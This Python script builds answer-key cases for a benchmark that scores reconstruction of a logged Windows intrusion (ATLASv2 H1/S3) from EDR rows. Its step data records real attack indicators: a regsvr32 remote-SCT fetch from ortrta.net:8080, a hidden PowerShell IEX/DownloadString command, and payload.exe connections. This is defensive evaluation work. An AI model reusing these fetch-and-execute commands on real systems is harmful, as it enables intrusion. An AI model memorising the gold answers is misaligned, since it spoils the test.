"""Build the six evidence-backed local investigation points for ATLASv2 H1/S3.

The S3 procedure and process labels are used to locate the incident, but every
scored claim below is backed by a canonical row in incident.db.  The generated
suite intentionally contains overlapping investigation points from one
incident, not six independent attacks.
"""

from __future__ import annotations

import argparse
import csv
import json
import sqlite3
from copy import deepcopy
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
DEFAULT_DB = ROOT / "Clouseau/artifact/scenarios/atlasv2/attack/h1/s3/incident.db"
DEFAULT_OUT = ROOT / "data/current_experiment/gold/atlasv2_s3_attack_behavior_chain_gold"


def score_template() -> dict:
    return {
        name: {"max": 1, "score": None, "note": ""}
        for name in ("subject", "action", "object", "evidence")
    } | {"step_total": {"max": 4, "score": None}}


def step(step_id: str, order: int, subject: str, action: str, object_: str,
         evidence_id: int, one_line_ja: str, confidence: str = "observed") -> dict:
    return {
        "step_id": step_id,
        "order": order,
        "focus_process": None,
        "subject": subject,
        "action": action,
        "object": object_,
        "evidence_basis": "Canonical CBC EDR event row",
        "confidence": confidence,
        "one_line_ja": one_line_ja,
        "process_code_object": object_,
        "scoring_template": score_template(),
        "canonical_evidence": [{"source_stream": "cbc-edr", "source_table": "cbc_events", "source_row_id": evidence_id}],
        "supporting_evidence": {"source_types": ["CBC event"], "sample_logs": []},
    }


CASES = [
    {
        "chain_id": "s3_attack_01_document_open_anchor",
        "chain_type": "attack_near_document_open",
        "chain_title": "Document opening anchor",
        "case_group": "attack_near_anchor",
        "focus_processes": ["winword.exe"],
        "window": ("2022-07-19T14:32:30Z", "2022-07-19T14:37:30Z"),
        "observed_behavior": "Explorer starts WINWORD with msf.rtf; WINWORD's command line names the document and it creates the document lock file.",
        "scenario_interpretation": "Attack-near anchor only. This case does not assert compromise or exploitation.",
        "limitations": ["The observed rows establish document opening context, not exploitation.", "This case overlaps the same Word process as s3_attack_02."],
        "steps": [
            step("S3-01-S01", 1, "explorer.exe (PID 1604)", "started", "WINWORD.EXE (PID 5592)", 9807,
                 "Explorer.exe が WINWORD.EXE (PID 5592) を起動した。"),
            step("S3-01-S02", 2, "WINWORD.EXE (PID 5592)", "ran with document path in command line", r"C:\Users\aalsahee\Downloads\s3take2\msf.rtf", 9813,
                 "WINWORD.EXE のコマンドラインに msf.rtf が指定されていた。"),
            step("S3-01-S03", 3, "WINWORD.EXE (PID 5592)", "created", r"C:\Users\aalsahee\Downloads\s3take2\~$msf.rtf", 8706,
                 "WINWORD.EXE が msf.rtf のロックファイルを作成した。"),
        ],
    },
    {
        "chain_id": "s3_attack_02_word_temp_rtf_context",
        "chain_type": "attack_near_document_processing",
        "chain_title": "Word temporary RTF processing",
        "case_group": "attack_near_context",
        "focus_processes": ["winword.exe"],
        "window": ("2022-07-19T14:32:30Z", "2022-07-19T14:37:30Z"),
        "observed_behavior": "WINWORD opens the original RTF, creates a temporary RTF, and later deletes that temporary RTF.",
        "scenario_interpretation": "Attack-near document-processing context. These file operations are not asserted malicious.",
        "limitations": ["The log does not establish why Word created the temporary RTF.", "This context case is reported separately from attack-associated reconstruction cases."],
        "steps": [
            step("S3-02-S01", 1, "WINWORD.EXE (PID 5592)", "opened/read", r"C:\Users\aalsahee\Downloads\s3take2\msf.rtf", 8705,
                 "WINWORD.EXE が msf.rtf を開いて読み書きした。"),
            step("S3-02-S02", 2, "WINWORD.EXE (PID 5592)", "created", r"C:\Users\aalsahee\AppData\Local\Temp\oice_ce7908a8-1b1c-41bb-9778-64a530acad65.0\c586a0f0.rtf", 8767,
                 "WINWORD.EXE が一時RTFファイルを作成した。"),
            step("S3-02-S03", 3, "WINWORD.EXE (PID 5592)", "deleted", r"C:\Users\aalsahee\AppData\Local\Temp\oice_ce7908a8-1b1c-41bb-9778-64a530acad65.0\c586a0f0.rtf", 8041,
                 "WINWORD.EXE が同じ一時RTFファイルを削除した。"),
        ],
    },
    {
        "chain_id": "s3_attack_03_eqnedt32_regsvr32_remote_sct",
        "chain_type": "remote_sct_proxy_execution",
        "chain_title": "Equation Editor to regsvr32 remote SCT",
        "case_group": "attack_associated",
        "focus_processes": ["eqnedt32.exe", "regsvr32.exe"],
        "window": ("2022-07-19T14:31:00Z", "2022-07-19T14:36:00Z"),
        "observed_behavior": "Equation Editor starts regsvr32, whose command line names a remote SCT, followed by recorded connection creation to port 8080.",
        "scenario_interpretation": "Attack-associated proxy-execution behavior; the local evidence does not by itself prove execution success.",
        "limitations": ["EQNEDT32 itself is recorded as launched by the DCOM service; this case only claims the directly observed EQNEDT32-to-regsvr32 edge.", "The connection does not by itself establish payload execution success."],
        "steps": [
            step("S3-03-S01", 1, "svchost.exe / DcomLaunch (PID 648)", "started", "EQNEDT32.EXE (PID 6032)", 7814,
                 "DCOMサービスが EQNEDT32.EXE (PID 6032) を起動した。"),
            step("S3-03-S02", 2, "EQNEDT32.EXE (PID 6032)", "started", "regsvr32.exe (PID 6124)", 7829,
                 "EQNEDT32.EXE が regsvr32.exe (PID 6124) を子プロセスとして起動した。"),
            step("S3-03-S03", 3, "regsvr32.exe (PID 6124)", "initiated connection using remote SCT command", "ortrta.net / 10.193.66.115:8080; /i:http://ortrta.net:8080/sF5riGj4K26DK.sct", 7889,
                 "regsvr32.exe がリモートSCTを指定し、10.193.66.115:8080 への接続開始を記録した。"),
        ],
    },
    {
        "chain_id": "s3_attack_04_regsvr32_hidden_powershell",
        "chain_type": "remote_sct_to_hidden_powershell",
        "chain_title": "regsvr32 to hidden PowerShell download command",
        "case_group": "attack_associated",
        "focus_processes": ["regsvr32.exe", "powershell.exe"],
        "window": ("2022-07-19T14:35:00Z", "2022-07-19T14:40:00Z"),
        "observed_behavior": "Equation Editor starts regsvr32, which starts hidden PowerShell with an IEX/DownloadString command; PowerShell records connection creation to ports 8080 and 8443.",
        "scenario_interpretation": "Attack-associated command execution behavior. The command indicates requested retrieval; successful retrieval is not asserted.",
        "limitations": ["The first and second Equation Editor/regsvr32 sequences are distinct in time; this case uses the later sequence.", "Network connections alone do not establish download completion."],
        "steps": [
            step("S3-04-S01", 1, "EQNEDT32.EXE (PID 2244)", "started", "regsvr32.exe (PID 3992)", 17797,
                 "EQNEDT32.EXE が regsvr32.exe (PID 3992) を子プロセスとして起動した。"),
            step("S3-04-S02", 2, "regsvr32.exe (PID 3992)", "started", "powershell.exe (PID 2340), -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString(...))", 17863,
                 "regsvr32.exe が隠しPowerShellを起動し、IEX/DownloadString コマンドが記録された。"),
            step("S3-04-S03", 3, "powershell.exe (PID 2340)", "initiated connection", "10.193.66.115:8080", 18136,
                 "PowerShell が 10.193.66.115:8080 への接続開始を記録した。"),
            step("S3-04-S04", 4, "powershell.exe (PID 2340)", "initiated connection", "10.193.66.115:8443", 18152,
                 "PowerShell が 10.193.66.115:8443 への接続開始を記録した。"),
        ],
    },
    {
        "chain_id": "s3_attack_05_powershell_cmd_payload",
        "chain_type": "powershell_cmd_payload_process_chain",
        "chain_title": "PowerShell to cmd to payload process chain",
        "case_group": "attack_associated",
        "focus_processes": ["powershell.exe", "cmd.exe", "payload.exe"],
        "window": ("2022-07-19T14:35:00Z", "2022-07-19T14:40:00Z"),
        "observed_behavior": "PowerShell starts cmd, cmd starts payload.exe, and the payload process starts a child payload process.",
        "scenario_interpretation": "Attack-associated process lineage. The local evidence does not assert the payload's high-level purpose.",
        "limitations": ["The behavior chain establishes process lineage, not file transfer or exfiltration."],
        "steps": [
            step("S3-05-S01", 1, "powershell.exe (PID 2340)", "started", "cmd.exe (PID 1880)", 18350,
                 "PowerShell が cmd.exe (PID 1880) を子プロセスとして起動した。"),
            step("S3-05-S02", 2, "cmd.exe (PID 1880)", "started", r"C:\Users\aalsahee\payload.exe (PID 3208)", 18358,
                 "cmd.exe が payload.exe (PID 3208) を子プロセスとして起動した。"),
            step("S3-05-S03", 3, "payload.exe (PID 3208)", "started", "payload.exe (PID 4964)", 18470,
                 "payload.exe (PID 3208) が別の payload.exe (PID 4964) を起動した。"),
        ],
    },
    {
        "chain_id": "s3_attack_06_payload_connection_cleanup",
        "chain_type": "payload_connection_and_cleanup",
        "chain_title": "Payload connection and temporary-runtime cleanup",
        "case_group": "attack_associated",
        "focus_processes": ["payload.exe"],
        "window": ("2022-07-19T14:35:00Z", "2022-07-19T14:40:00Z"),
        "observed_behavior": "A payload child process records connection creation to port 9999 and terminates; at a later shared timestamp, its parent records deletion of a temporary runtime directory and process termination.",
        "scenario_interpretation": "Attack-associated endpoint behavior. The connection is not labelled C2 or exfiltration by the local evidence alone.",
        "limitations": ["A single network connection does not establish C2 or PDF exfiltration.", "The _MEI directory deletion is described only as observed cleanup, not anti-forensic intent."],
        "steps": [
            step("S3-06-S01", 1, "payload.exe (PID 4964)", "initiated connection", "ortrta.net / 10.193.66.115:9999", 18558,
                 "payload.exe (PID 4964) が ortrta.net / 10.193.66.115:9999 への接続開始を記録した。"),
            step("S3-06-S02", 2, "payload.exe (PID 4964)", "terminated", "payload.exe (PID 4964)", 18559,
                 "payload.exe (PID 4964) の終了が記録された。"),
            step("S3-06-S03", 3, "payload.exe (PID 3208)", "deleted", r"C:\Users\aalsahee\AppData\Local\Temp\_MEI32082", 18662,
                 "親payload.exe が一時ランタイムディレクトリ _MEI32082 を削除した。"),
            step("S3-06-S04", 4, "payload.exe (PID 3208)", "terminated", r"C:\Users\aalsahee\payload.exe", 18663,
                 "親payload.exe (PID 3208) の終了が同時刻に記録された。"),
        ],
        "gold_order_pairs": [("S3-06-S01", "S3-06-S02"), ("S3-06-S02", "S3-06-S03")],
    },
]


def canonical_record(con: sqlite3.Connection, row_id: int) -> dict:
    row = con.execute("SELECT * FROM cbc_events WHERE id = ?", (row_id,)).fetchone()
    if row is None:
        raise ValueError(f"Missing cbc_events.id={row_id}")
    result = dict(row)
    return {
        "source_stream": result["stream_name"],
        "source_table": "cbc_events",
        "source_row_id": result["id"],
        "timestamp_utc": result["timestamp_utc"],
        "action": result["action"],
        "process_path": result["process_path"],
        "process_pid": result["process_pid"],
        "parent_path": result["parent_path"],
        "parent_pid": result["parent_pid"],
        "process_cmdline": result["process_cmdline"],
        "object_name": result["object_name"],
        "remote_ip": result["remote_ip"],
        "remote_port": result["remote_port"],
        "netconn_domain": result["netconn_domain"],
        "childproc_name": result["childproc_name"],
        "childproc_pid": result["childproc_pid"],
    }


def sample_log(record: dict) -> str:
    parts = [
        f"cbc-edr table=cbc_events row_id={record['source_row_id']}",
        f"time={record['timestamp_utc']}",
        f"action={record['action']}",
        f"process={record['process_path']}",
        f"pid={record['process_pid']}",
    ]
    for key in ("parent_path", "parent_pid", "process_cmdline", "object_name", "remote_ip", "remote_port", "netconn_domain", "childproc_name", "childproc_pid"):
        if record[key] is not None:
            parts.append(f"{key}={record[key]}")
    return " ".join(parts)


def materialize_case(con: sqlite3.Connection, spec: dict) -> dict:
    start, end = spec["window"]
    steps = deepcopy(spec["steps"])
    seen = set()
    for item in steps:
        records = []
        for evidence in item["canonical_evidence"]:
            record = canonical_record(con, evidence["source_row_id"])
            if not start <= record["timestamp_utc"] <= end:
                raise ValueError(f"{spec['chain_id']} has out-of-window evidence {record['source_row_id']}")
            if record["source_row_id"] in seen:
                raise ValueError(f"{spec['chain_id']} reuses evidence {record['source_row_id']}")
            seen.add(record["source_row_id"])
            records.append(record)
        item["focus_process"] = spec["focus_processes"][0]
        item["canonical_evidence"] = records
        item["supporting_evidence"]["sample_logs"] = [sample_log(record) for record in records]
    times = [entry["canonical_evidence"][0]["timestamp_utc"] for entry in steps]
    timeline = [item["one_line_ja"] for item in steps]
    chain_id = spec["chain_id"]
    return {
        "chain_id": chain_id,
        "episode_id": "ATLASv2-H1-S3",
        "evaluation_unit": "atlasv2_s3_attack_behavior_chain_gold",
        "case_group": spec["case_group"],
        "independence_note": "One of six overlapping investigation points from the same S3 incident; do not treat as an independent attack sample.",
        "chain_type": spec["chain_type"],
        "chain_title": spec["chain_title"],
        "chain_description": spec["observed_behavior"],
        "observed_behavior": spec["observed_behavior"],
        "scenario_interpretation": spec["scenario_interpretation"],
        "scenario_ground_truth_sources": [
            "external/reapr-ground-truth/atlasv2/attack_descriptions/S-3.txt",
            "external/reapr-ground-truth/atlasv2/atlasv2_labels.csv",
        ],
        "stage3_visibility_policy": "Scenario description, labels, and alert summaries are not part of the Stage 3 model input. Gold is scored on observed_behavior only.",
        "stages_present": ["stage3"],
        "input_scope": {
            "host": "WIN-32-H1",
            "focus_processes": spec["focus_processes"],
            "chain_window_start_utc": start,
            "chain_window_end_utc": end,
            "window_minutes": 5,
            "source_streams": ["cbc-edr", "sysmon"],
            "input_policy": "Stage 3 receives host, focus process(es), and time window; CBC alert summaries and scenario ground truth are excluded.",
        },
        "behavior_timeline": steps,
        "gold_steps": steps,
        "gold_order_pairs": [list(pair) for pair in spec.get("gold_order_pairs", [(steps[i]["step_id"], steps[i + 1]["step_id"]) for i in range(len(steps) - 1)])],
        "timeline_ja": timeline,
        "natural_language_summary_ja": " ".join(timeline),
        "evidence_span_utc": {"start": min(times), "end": max(times)},
        "out_of_scope_same_episode": [],
        "sequence_level_checks": {
            "temporal_order": {"max": 1, "score": None, "definition": "観測時刻順に行動列を復元できるか。"},
            "step_separation": {"max": 1, "score": None, "definition": "異なる観測行を別の行動として区別できるか。"},
            "limitations": {"max": 1, "score": None, "definition": "観測だけで言えないことを明示できるか。"},
        },
        "case_scoring": {
            "step_score_max": len(steps) * 4,
            "sequence_score_max": 3,
            "case_score_max": len(steps) * 4 + 3,
            "step_score": None,
            "sequence_score": None,
            "case_score": None,
        },
        "limitations": spec["limitations"],
    }


def write_summary(rows: list[dict], out_dir: Path) -> None:
    fields = ["chain_id", "case_group", "chain_title", "focus_processes", "window_start_utc", "window_end_utc", "step_count", "evidence_span_start_utc", "evidence_span_end_utc"]
    with (out_dir / "chain_summary.csv").open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=fields)
        writer.writeheader()
        writer.writerows(rows)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--db", type=Path, default=DEFAULT_DB)
    parser.add_argument("--out-dir", type=Path, default=DEFAULT_OUT)
    args = parser.parse_args()
    args.out_dir.mkdir(parents=True, exist_ok=True)
    con = sqlite3.connect(args.db)
    con.row_factory = sqlite3.Row
    summary = []
    manifest = []
    for spec in CASES:
        gold = materialize_case(con, spec)
        case_dir = args.out_dir / "by_chain" / gold["chain_id"]
        case_dir.mkdir(parents=True, exist_ok=True)
        (case_dir / "chain_gold.json").write_text(json.dumps(gold, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        manifest.append({"chain_id": gold["chain_id"], "gold_chain_file": str((case_dir / "chain_gold.json").relative_to(ROOT)), "case_group": gold["case_group"]})
        summary.append({
            "chain_id": gold["chain_id"], "case_group": gold["case_group"], "chain_title": gold["chain_title"],
            "focus_processes": ";".join(gold["input_scope"]["focus_processes"]),
            "window_start_utc": gold["input_scope"]["chain_window_start_utc"], "window_end_utc": gold["input_scope"]["chain_window_end_utc"],
            "step_count": len(gold["gold_steps"]), "evidence_span_start_utc": gold["evidence_span_utc"]["start"], "evidence_span_end_utc": gold["evidence_span_utc"]["end"],
        })
    write_summary(summary, args.out_dir)
    (args.out_dir / "chain_gold_index.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    (args.out_dir / "README.md").write_text(
        "# ATLASv2 H1/S3 attack behavior-chain gold\n\n"
        "Six overlapping local investigation points from one S3 incident. They must not be counted as six independent attacks. "
        "Each scored claim is linked to a canonical `cbc_events` row, and the builder fails if an evidence row is outside its declared five-minute window or reused within a case.\n",
        encoding="utf-8",
    )
    print(f"Wrote {len(manifest)} S3 gold cases to {args.out_dir}")


if __name__ == "__main__":
    main()
